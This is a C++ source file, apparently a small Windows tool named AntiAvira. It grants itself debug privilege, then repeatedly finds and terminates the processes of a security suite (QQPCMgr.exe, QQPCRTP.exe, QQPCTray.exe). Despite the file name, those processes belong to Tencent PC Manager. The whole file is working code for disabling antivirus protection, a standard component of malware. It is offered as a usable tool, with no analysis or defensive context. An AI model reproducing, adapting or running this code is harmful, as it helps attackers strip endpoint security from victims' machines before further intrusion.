// AntiAvira.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"


DWORD   GetProcessIdByName(TCHAR *szProcessName)
{
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32;
    RtlZeroMemory(&pe32, sizeof(PROCESSENTRY32));
    pe32.dwSize = sizeof(PROCESSENTRY32);
    BOOL bContinue = Process32First(hSnapshot, &pe32);
    while (bContinue)
    {
        if (!_tcsicmp(pe32.szExeFile, szProcessName)) {
            CloseHandle(hSnapshot);
            return pe32.th32ProcessID;
        }
        bContinue = Process32Next(hSnapshot, &pe32);
    }
    CloseHandle(hSnapshot);
    return 0;
}

int _tmain(int argc, _TCHAR* argv[])
{
    HANDLE hToken;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES,&hToken);
    LUID uid;
    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &uid);
    TOKEN_PRIVILEGES tp = { 0 };
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    tp.Privileges[0].Luid = uid;
    tp.PrivilegeCount = 1;	
    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);

    TCHAR   *szAvireaProcesses[] = { TEXT("QQPCMgr.exe"), TEXT("QQPCRTP.exe"), TEXT("QQPCTray.exe") };
    for (int i = 0; i < sizeof(szAvireaProcesses) / sizeof(szAvireaProcesses[0]); i++)
    {
        while (DWORD dwProcessId = GetProcessIdByName(szAvireaProcesses[i]))
        {
            HANDLE  hProcess = OpenProcess(PROCESS_ALL_ACCESS, NULL, dwProcessId);
            TerminateProcess(hProcess, 0);           
            CloseHandle(hProcess);
        }
    }
    printf("The processes has been terminated.\n");
    getchar();
	return 0;
}
